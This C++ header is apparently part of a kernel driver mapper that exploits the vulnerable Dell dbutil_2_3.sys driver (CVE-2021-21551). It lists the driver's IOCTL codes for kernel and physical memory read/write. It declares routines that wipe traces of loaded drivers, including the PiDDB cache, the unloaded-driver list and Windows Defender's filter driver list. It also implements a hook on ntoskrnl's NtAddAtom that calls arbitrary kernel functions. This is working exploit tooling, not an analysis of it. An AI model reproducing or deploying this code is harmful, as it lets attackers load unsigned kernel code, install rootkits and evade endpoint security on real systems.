#pragma once
#include <Windows.h>
#include <string>
#include <iostream>

#include "utils.hpp"
#include "nt.hpp"

/*
 * dell_driver — Replacement for intel_driver using Dell dbutil_2_3.sys
 *
 * CVE-2021-21551: The Dell BIOS utility driver exposes kernel virtual
 * memory read/write through IOCTLs without proper validation.
 *
 * All higher-level operations (CallKernelFunction, cleanup, pattern scan)
 * are built on top of direct virtual memory R/W via IOCTL.
 *
 * This namespace exposes the SAME public interface as intel_driver so
 * mapper.cpp requires only a namespace rename.
 */

namespace dell_driver
{
	/* ── IOCTL constants ──────────────────────────────────────────── */

	constexpr ULONG32 IOCTL_PHYS_READ  = 0x9B0C1EC0;
	constexpr ULONG32 IOCTL_VIRT_READ  = 0x9B0C1EC4;
	constexpr ULONG32 IOCTL_VIRT_WRITE = 0x9B0C1EC8;
	constexpr ULONG32 IOCTL_PHYS_WRITE = 0x9B0C1ECC;

	/* ── Global state ─────────────────────────────────────────────── */

	extern HANDLE   hDevice;
	extern ULONG64  ntoskrnlAddr;

	/* ── Driver lifecycle ─────────────────────────────────────────── */

	bool      IsRunning();
	NTSTATUS  Load();
	NTSTATUS  Unload();
	NTSTATUS  AcquireDebugPrivilege();

	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();
	bool ProbeIoctlLayout(uint64_t ntoskrnlBase);

	/* ── Virtual memory operations (direct IOCTL) ─────────────────── */

	bool MemCopy(uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(uint64_t address, uint32_t value, uint64_t size);
	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	bool GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(uint64_t address, uint32_t size);

	/* ── Kernel function call (NtAddAtom hook) ────────────────────── */

	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);

	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
	bool     FreePool(uint64_t address);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool     MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN  MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	/* ── Trace cleanup ────────────────────────────────────────────── */

	bool ClearPiDDBCacheTable();
	bool ClearKernelHashBucketList();
	bool ClearMmUnloadedDrivers();
	bool ClearWdFilterDriverList();

	/* ── Helpers ──────────────────────────────────────────────────── */

	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID   RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID   ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	void CrashLogFromHpp(const char* msg); // defined in dell_driver.cpp

	/* ── CallKernelFunction template ────────────────────────────── */

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		CrashLogFromHpp("CallKernelFunction: start");

		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			kdmLog(L"[-] Failed to load ntdll.dll" << std::endl);
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			kdmLog(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(dell_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			kdmLog(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			kdmLog(L"[-] FAILED!: The code was already hooked!! another instance running?!" << std::endl);
			return false;
		}

		/* PTE manipulation makes page writable before hooking */
		CrashLogFromHpp("CallKernelFunction: writing JMP hook to NtAddAtom");
		if (!WriteToReadOnlyMemory(kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		CrashLogFromHpp("CallKernelFunction: calling hooked NtAddAtom (entering kernel)");
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);
			Function(arguments...);
		}

		CrashLogFromHpp("CallKernelFunction: returned from kernel, restoring NtAddAtom");
		return WriteToReadOnlyMemory(kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
